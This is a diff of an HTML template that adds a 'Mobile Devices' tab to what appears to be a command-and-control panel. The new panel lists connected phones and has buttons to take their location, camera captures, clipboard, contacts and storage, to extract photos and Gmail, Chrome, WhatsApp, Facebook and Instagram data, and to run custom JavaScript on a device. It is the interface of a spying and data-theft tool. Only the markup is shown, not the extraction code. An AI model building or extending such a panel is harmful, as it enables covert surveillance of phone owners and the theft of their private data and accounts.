@@ -223,6 +223,12 @@
                             <i class="fas fa-folder-open mr-2 group-hover:text-slate-200"></i>
                             <span>File Manager</span>
                         </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            data-tab="mobile">
+                            <i class="fas fa-mobile-alt mr-2 group-hover:text-slate-200"></i>
+                            <span>Mobile Devices</span>
+                        </button>
                     </nav>
                 </div>
 
@@ -439,6 +445,148 @@
                         </div>
                     </div>
 
+                    <!-- Mobile Devices Tab -->
+                    <div id="tab-mobile" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div
+                            class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                            <h2 class="text-xl font-bold text-white">📱 Mobile Device Control</h2>
+                            <button id="btn-refresh-mobile"
+                                class="px-3 py-1 bg-slate-800 text-slate-400 rounded hover:bg-slate-700 text-sm">
+                                <i class="fas fa-sync-alt"></i> Refresh
+                            </button>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+                            <!-- Mobile Clients List -->
+                            <div
+                                class="lg:col-span-1 bg-slate-900 rounded-xl border border-slate-800 flex flex-col overflow-hidden h-[600px]">
+                                <div class="p-3 border-b border-slate-800 text-xs font-bold text-slate-500 uppercase">
+                                    Connected Devices</div>
+                                <div id="mobile-client-list" class="flex-1 overflow-y-auto p-2 space-y-2">
+                                    <div class="text-center text-slate-600 py-4 italic">No mobile devices</div>
+                                </div>
+                            </div>
+
+                            <!-- Mobile Control Panel -->
+                            <div class="lg:col-span-3 space-y-4">
+                                <!-- Device Info Card -->
+                                <div id="mobile-device-info"
+                                    class="bg-slate-900 rounded-xl border border-slate-800 p-4 hidden">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">Device Information</h3>
+                                    <div id="mobile-info-content" class="grid grid-cols-2 gap-3 text-xs">
+                                        <!-- Populated by JS -->
+                                    </div>
+                                </div>
+
+                                <!-- Quick Actions -->
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">Quick Actions</h3>
+                                    <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
+                                        <button onclick="sendMobileCommand('get_location')"
+                                            class="px-3 py-2 bg-blue-500/10 text-blue-400 rounded hover:bg-blue-500/20 text-sm border border-blue-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-map-marker-alt"></i>
+                                            <span>Location</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('capture_camera')"
+                                            class="px-3 py-2 bg-purple-500/10 text-purple-400 rounded hover:bg-purple-500/20 text-sm border border-purple-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-camera"></i>
+                                            <span>Camera</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('get_battery')"
+                                            class="px-3 py-2 bg-green-500/10 text-green-400 rounded hover:bg-green-500/20 text-sm border border-green-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-battery-full"></i>
+                                            <span>Battery</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('get_device_info')"
+                                            class="px-3 py-2 bg-yellow-500/10 text-yellow-400 rounded hover:bg-yellow-500/20 text-sm border border-yellow-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-info-circle"></i>
+                                            <span>Info</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('get_clipboard')"
+                                            class="px-3 py-2 bg-pink-500/10 text-pink-400 rounded hover:bg-pink-500/20 text-sm border border-pink-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-clipboard"></i>
+                                            <span>Clipboard</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('vibrate')"
+                                            class="px-3 py-2 bg-red-500/10 text-red-400 rounded hover:bg-red-500/20 text-sm border border-red-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-mobile-alt"></i>
+                                            <span>Vibrate</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('get_storage')"
+                                            class="px-3 py-2 bg-indigo-500/10 text-indigo-400 rounded hover:bg-indigo-500/20 text-sm border border-indigo-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-hdd"></i>
+                                            <span>Storage</span>
+                                        </button>
+                                        <button onclick="sendMobileCommand('get_contacts')"
+                                            class="px-3 py-2 bg-cyan-500/10 text-cyan-400 rounded hover:bg-cyan-500/20 text-sm border border-cyan-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-address-book"></i>
+                                            <span>Contacts</span>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Advanced Data Extraction -->
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">🔥 Advanced Extraction</h3>
+                                    <div class="grid grid-cols-1 md:grid-cols-3 gap-2">
+                                        <button onclick="extractPhotos()"
+                                            class="px-3 py-2 bg-gradient-to-r from-pink-500/10 to-purple-500/10 text-pink-400 rounded hover:from-pink-500/20 hover:to-purple-500/20 text-sm border border-pink-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-images"></i>
+                                            <span>Extract Photos</span>
+                                        </button>
+                                        <button onclick="extractGmail()"
+                                            class="px-3 py-2 bg-gradient-to-r from-red-500/10 to-orange-500/10 text-red-400 rounded hover:from-red-500/20 hover:to-orange-500/20 text-sm border border-red-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-envelope"></i>
+                                            <span>Gmail Data</span>
+                                        </button>
+                                        <button onclick="extractChrome()"
+                                            class="px-3 py-2 bg-gradient-to-r from-blue-500/10 to-cyan-500/10 text-blue-400 rounded hover:from-blue-500/20 hover:to-cyan-500/20 text-sm border border-blue-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fab fa-chrome"></i>
+                                            <span>Chrome Data</span>
+                                        </button>
+                                        <button onclick="extractWhatsApp()"
+                                            class="px-3 py-2 bg-gradient-to-r from-green-500/10 to-emerald-500/10 text-green-400 rounded hover:from-green-500/20 hover:to-emerald-500/20 text-sm border border-green-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fab fa-whatsapp"></i>
+                                            <span>WhatsApp</span>
+                                        </button>
+                                        <button onclick="extractFacebook()"
+                                            class="px-3 py-2 bg-gradient-to-r from-blue-600/10 to-indigo-500/10 text-blue-400 rounded hover:from-blue-600/20 hover:to-indigo-500/20 text-sm border border-blue-600/20 flex items-center justify-center space-x-2">
+                                            <i class="fab fa-facebook"></i>
+                                            <span>Facebook</span>
+                                        </button>
+                                        <button onclick="extractInstagram()"
+                                            class="px-3 py-2 bg-gradient-to-r from-purple-500/10 to-pink-500/10 text-purple-400 rounded hover:from-purple-500/20 hover:to-pink-500/20 text-sm border border-purple-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fab fa-instagram"></i>
+                                            <span>Instagram</span>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Custom Command -->
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">Custom JavaScript</h3>
+                                    <div class="flex space-x-2">
+                                        <input type="text" id="mobile-custom-cmd"
+                                            class="flex-1 bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-blue-500"
+                                            placeholder="Enter JavaScript code... (e.g., alert('Hello'))"
+                                            onkeypress="if(event.key==='Enter') sendCustomMobileCommand()">
+                                        <button onclick="sendCustomMobileCommand()"
+                                            class="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 text-sm">
+                                            <i class="fas fa-play"></i> Execute
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Output Console -->
+                                <div class="bg-black rounded-xl border border-slate-800 p-4 h-[200px] overflow-y-auto font-mono text-sm"
+                                    id="mobile-output">
+                                    <div class="text-emerald-500">[Mobile Console] Ready. Select a device and send
+                                        commands.</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
                 </div>
             </div>
         </div>
@@ -450,6 +598,7 @@
     <script src="{{ url_for('static', filename='js/script.js') }}"></script>
     <script src="{{ url_for('static', filename='js/c2_client.js') }}"></script>
     <script src="{{ url_for('static', filename='js/file_manager.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/mobile_control.js') }}"></script>
 </body>
 
 </html>
